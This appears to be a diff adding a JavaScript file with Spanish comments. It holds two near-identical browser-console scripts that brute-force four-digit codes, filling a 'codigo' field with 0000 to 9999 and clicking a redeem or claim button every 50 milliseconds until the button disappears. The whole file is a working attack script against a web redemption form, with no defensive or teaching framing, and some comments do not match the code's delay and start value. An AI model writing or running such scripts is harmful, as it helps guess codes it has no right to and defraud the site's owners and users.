@@ -1,0 +1,80 @@
+// Selecciona el elemento de entrada por su id
+var inputElement = document.getElementById('codigo');
+
+// Función recursiva para probar los números con un delay
+function testNumber(i) {
+    // Selecciona el botón por su id
+    var buttonElement = document.getElementById('btnCanjear');
+    
+    // Si el botón no existe, imprime el último número probado y termina la función
+    if (!buttonElement) {
+        console.log("El último número probado fue: " + (i - 1).toString().padStart(4, '0'));
+        return;
+    }
+    
+    if (i > 9999) {
+        return;
+    }
+    
+    // Convierte el número a string, rellena con ceros a la izquierda hasta tener 4 dígitos y lo asigna al valor del elemento de entrada
+    inputElement.value = i.toString().padStart(4, '0');
+    
+    // Haz click en el botón
+    buttonElement.click();
+
+    // Llama a la misma función con el siguiente número después de medio segundo
+    setTimeout(function() {
+        testNumber(i + 1);
+    }, 50);  // 50 milisegundos de delay (8.3 minutos en total)
+}
+
+// Inicia la prueba con el número 1
+testNumber(0);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// Selecciona el elemento de entrada por su id
+var inputElement = document.getElementById('codigo');
+
+// Función recursiva para probar los números con un delay
+function testNumber(i) {
+    // Selecciona el botón por su id
+    var buttonElement = document.getElementById('btnReclamar');
+    
+    // Si el botón no existe, imprime el último número probado y termina la función
+    if (!buttonElement) {
+        console.log("El último número probado fue: " + (i - 1).toString().padStart(4, '0'));
+        return;
+    }
+    
+    if (i > 9999) {
+        return;
+    }
+    
+    // Convierte el número a string, rellena con ceros a la izquierda hasta tener 4 dígitos y lo asigna al valor del elemento de entrada
+    inputElement.value = i.toString().padStart(4, '0');
+    
+    // Haz click en el botón
+    buttonElement.click();
+
+    // Llama a la misma función con el siguiente número después de medio segundo
+    setTimeout(function() {
+        testNumber(i + 1);
+    }, 50);  // 50 milisegundos de delay (8.3 minutos en total)
+}
+
+// Inicia la prueba con el número 1
+testNumber(0);
